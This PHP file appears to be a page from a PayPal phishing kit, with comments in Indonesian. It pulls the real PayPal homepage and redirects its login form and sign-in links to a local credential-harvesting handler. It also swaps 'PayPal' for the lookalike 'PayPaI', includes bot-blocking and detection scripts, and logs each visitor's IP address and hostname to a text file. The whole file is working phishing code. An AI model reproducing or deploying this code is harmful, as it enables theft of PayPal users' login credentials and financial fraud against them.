<?php

include('../../blocker.php');
include('../../detect.php');

    $url     = "https://www.paypal.com/{$kode_negara}/webapps/mpp/home";

$options = array(
  'http'=>array(
    'method'=>"GET",
    'header'=>"User-Agent: ".$_SERVER['HTTP_USER_AGENT']."" // i.e. An iPad 
  )
);

$context = stream_context_create($options);

function getStr($string,$start,$end)
    {
        $str = explode($start,$string);
        $str = explode($end,$str[1]);
        return $str[0];
    }

# Pembeda Negara
if (stripos($negara, 'GB') !== false){
    $page   = file_get_contents('https://www.paypal.com/cz/webapps/mpp/home', false, $context);
    $title  = getStr($page, '<title>', '</title>');
    $select = getStr($page, '<div class="country-selector ">', '</div>');
    $result = str_replace($title, 'PayPal United Kingdom: Pay, Send Money & Accept Payments', $page);
    $result = str_replace($select, '<a href="?webapps/mpp/country-worldwide" title="Change Language or Country" class="country unitedkingdom">Change Language or Country</a>', $result);
} elseif (stripos($negara, 'US') !== false || stripos($negara, 'IR') !== false || stripos($negara, '') !== false || stripos($negara, 'JP') !== false){
    $page   = file_get_contents('https://www.paypal.com/cz/webapps/mpp/home', false, $context);
    $title  = getStr($page, '<title>', '</title>');
    $select = getStr($page, '<div class="country-selector ">', '</div>');
    $result = str_replace($title, 'Send Money, Pay Online or Set Up a Merchant Account - PayPal', $page);
    $result = str_replace($select, '<a href="?webapps/mpp/country-worldwide" title="See all countries" class="country US">See all countries</a>', $result);
} else {
    $result = file_get_contents($url, false, $context);
}

# Get Link
    $get_link = getStr($result, 'My Account;action-uri=', 'cgi-bin/webscr');
    $get_link = getStr($result, '<link rel="canonical" href="', 'home');
    $get_form = getStr($result, 'class="form-inline ">', 'novalidate="novalidate"');
    $loging   = 'webscr?cmd=_login-run&dispatch='.md5(gmdate('r'));

# Get pp home
    $view = str_replace("&#x3a;", ":", $result);
    $view = str_replace("&#x2f;", "/", $view);
    $view = str_replace("&#x3f;", "?", $view);
    $view = str_replace("&#x3d;", "=", $view);
    $view = str_replace($get_link."cgi-bin/webscr?cmd=_login-submit", $loging, $view);
    $view = str_replace($get_form, '<form action="webscr" method="post" ', $view);
    $view = str_replace("/cgi-bin/webscr?cmd=_login-submit", $loging, $view);
    $view = str_replace($get_link."cgi-bin/webscr?cmd=_login-run", "webscr?cmd=_login-run", $view);
    $view = str_replace($get_link, "?", $view);
    $view = str_replace('https://www.paypal.com/signin', $loging, $view);
    $view = str_replace('novalidate="novalidate" ', "", $view);
    $home = str_replace("PayPal", "PayPaI", $view);
echo $home;

//reccord IP masuk
if (gethostbyaddr($_SERVER['REMOTE_ADDR']) == $_SERVER['REMOTE_ADDR']){
    $file = fopen("../../data_ip_masuk.txt","a");
fwrite($file, $_SERVER['REMOTE_ADDR'].'
');
    fclose($file);
} else {
    $file = fopen("../../data_ip_masuk.txt","a");
fwrite($file, $_SERVER['REMOTE_ADDR'].' '.gethostbyaddr($_SERVER['REMOTE_ADDR']).'
');
    fclose($file);
}

exit;

?>